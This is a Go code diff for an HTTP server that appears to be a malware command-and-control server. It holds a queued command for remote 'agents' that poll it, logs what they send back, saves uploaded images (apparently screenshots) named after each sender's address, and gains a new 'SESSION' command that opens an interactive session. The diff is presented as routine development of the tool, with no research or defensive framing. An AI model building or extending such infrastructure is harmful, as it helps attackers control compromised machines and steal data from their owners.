@@ -17,11 +17,11 @@ func Serve() {
 	root := http.NewServeMux()
 	root.Handle("/", http.HandlerFunc(requestHandler()))
 
-	slog.Info("Starting server on port: " + config.Port)
 	server := http.Server{
-		Addr:    ":" + config.Port,
+		Addr:    ":" + config.BeaconPort,
 		Handler: root,
 	}
+	slog.Info("Starting server on port: " + config.BeaconPort)
 	err := server.ListenAndServe()
 	if err != nil {
 		slog.Error("Failed to start server: " + err.Error())
@@ -45,19 +45,27 @@ func requestHandler() http.HandlerFunc {
 		if r.Header.Get("Content-Type") == "image/png" {
 			slog.Info("Received response with image")
 			image, _, _ := image.Decode(bytes.NewReader(response))
-			out, _ := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
+			out, err := os.Create("./" + r.RemoteAddr + ":" + time.Now().Format("2006-01-01 00:00:00") + ".png")
+			if err != nil {
+				slog.Info("Failed creating image file")
+			}
 			defer out.Close()
 			png.Encode(out, image)
 		} else if string(response) != "" {
 			slog.Info("Received response:\n" + string(response))
 		} else {
+			mu.Lock()
+			if task.Command == "SESSION" {
+				slog.Info("Initiating session")
+				go InitiateSession()
+			}
 			requestCommand(w)
+			mu.Unlock()
 		}
 	}
 }
 
 func requestCommand(w http.ResponseWriter) {
-	mu.Lock()
 	if task.Command != "" {
 		w.Write([]byte(task.Command))
 		slog.Info("Command requested: " + task.Command)
@@ -66,5 +74,4 @@ func requestCommand(w http.ResponseWriter) {
 		w.Write([]byte(""))
 		slog.Info("Pinged agent")
 	}
-	mu.Unlock()
 }
